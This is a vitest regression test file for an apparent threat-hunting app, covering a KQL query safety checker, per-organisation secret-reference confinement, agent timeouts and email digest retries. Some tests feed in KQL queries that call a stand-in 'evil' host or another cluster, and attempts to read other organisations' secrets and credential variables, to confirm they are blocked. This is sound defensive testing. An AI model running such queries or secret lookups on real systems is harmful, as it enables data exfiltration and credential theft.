import { describe, expect, it, vi } from 'vitest'
import { EventType, type StreamChunk } from '@tanstack/ai'
import { readFileSync } from 'node:fs'
import path from 'node:path'
import { parseEnv } from '../src/server/env'
import { assertSafeKql, UnsafeQueryError } from '../src/server/hunting/safety'
import { allowedSecretRefPrefix, resolveClientSecret, upsertConnector } from '../src/server/hunting/broker'
import { withTimeout } from '../src/server/agents/runtime'
import { buildDigest, runDailyDigest, utcDay } from '../src/server/ti/digest'
import * as mail from '../src/server/mail'
import { getDb } from '../src/server/db/client'
import { digests } from '../src/server/db/schema'
import { eq } from 'drizzle-orm'
import { makeOrg, makeUser, member } from './helpers'

const TENANT = '0f0e0d0c-0b0a-0908-0706-050403020100'
const CLIENT = '01020304-0506-0708-090a-0b0c0d0e0f10'

describe('council review regressions', () => {
  it('.env.example parses: empty placeholders are treated as unset', () => {
    const text = readFileSync(path.resolve(__dirname, '../../../.env.example'), 'utf8')
    const vars = Object.fromEntries(
      text
        .split('\n')
        .filter((l) => /^[A-Z_]+=/.test(l))
        .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]),
    )
    const e = parseEnv({ ...vars, BETTER_AUTH_SECRET: 'x'.repeat(40), APP_ENCRYPTION_KEY: 'a'.repeat(64) })
    expect(e.RESPONSE_LOGICAPP_URL).toBeUndefined()
    expect(e.MODEL_NAME).toBeUndefined()
  })

  it('a // inside a string literal cannot hide blocked operators', () => {
    for (const q of [
      'print u="https://x"; externaldata(a:string)[@"https://evil/x"]',
      'print "http://a" | evaluate http_request("https://evil")',
      'let x = "//"; cluster("other").database("d").T',
    ]) {
      expect(() => assertSafeKql(q), q).toThrow(UnsafeQueryError)
    }
  })

  it("connector secret refs are confined to the org's own env namespace", async () => {
    const a = await makeOrg('RefA')
    const b = await makeOrg('RefB')
    process.env[`${allowedSecretRefPrefix(b)}SECRET`] = 'org-b-secret'
    await expect(upsertConnector(a, { tenantId: TENANT, clientId: CLIENT, clientSecretRef: `env:${allowedSecretRefPrefix(b)}SECRET` })).rejects.toThrow(/must be env:/)
    await expect(upsertConnector(a, { tenantId: TENANT, clientId: CLIENT, clientSecretRef: 'env:BETTER_AUTH_SECRET' })).rejects.toThrow(/must be env:/)
    // A row written before the check (or by hand) is still refused at resolve time.
    expect(() => resolveClientSecret({ orgId: a, clientSecretEnc: null, clientSecretRef: 'env:DATABASE_URL' })).toThrow(/must be env:/)
    process.env[`${allowedSecretRefPrefix(a)}SECRET`] = 'org-a-secret'
    await upsertConnector(a, { tenantId: TENANT, clientId: CLIENT, clientSecretRef: `env:${allowedSecretRefPrefix(a)}SECRET` })
    expect(resolveClientSecret({ orgId: a, clientSecretEnc: null, clientSecretRef: `env:${allowedSecretRefPrefix(a)}SECRET` })).toBe('org-a-secret')
  })

  it('agent timeouts surface as RUN_ERROR even when the stream ends quietly on abort', async () => {
    const abort = new AbortController()
    async function* quiet(): AsyncIterable<StreamChunk> {
      yield { type: EventType.RUN_STARTED, runId: 'r', threadId: 't', timestamp: Date.now() } as unknown as StreamChunk
      await new Promise((r) => setTimeout(r, 50))
    }
    const out: string[] = []
    for await (const c of withTimeout(quiet(), 10, abort)) out.push(c.type)
    expect(out.at(-1)).toBe(EventType.RUN_ERROR)
  })

  it('an SMTP failure for one org does not stop other orgs, and the claim is released for retry', async () => {
    const day = utcDay()
    const a = await makeOrg('MailA')
    const b = await makeOrg('MailB')
    const ua = await makeUser('mail-a@example.test')
    const ub = await makeUser('mail-b@example.test')
    await member(a, ua, 'owner')
    await member(b, ub, 'owner')
    const send = vi.spyOn(mail, 'sendMail').mockImplementation(async (to) => {
      if (to.includes('mail-a@example.test')) throw new Error('smtp down')
      return true
    })
    const r = await runDailyDigest(day)
    expect(r.failed).toBeGreaterThanOrEqual(1)
    const [da] = await getDb().select().from(digests).where(eq(digests.orgId, a))
    const [db] = await getDb().select().from(digests).where(eq(digests.orgId, b))
    expect(da!.emailedAt).toBeNull()
    expect(db!.emailedAt).not.toBeNull()
    send.mockRestore()
    expect((await buildDigest(a, day)).day).toBe(day)
  })
})
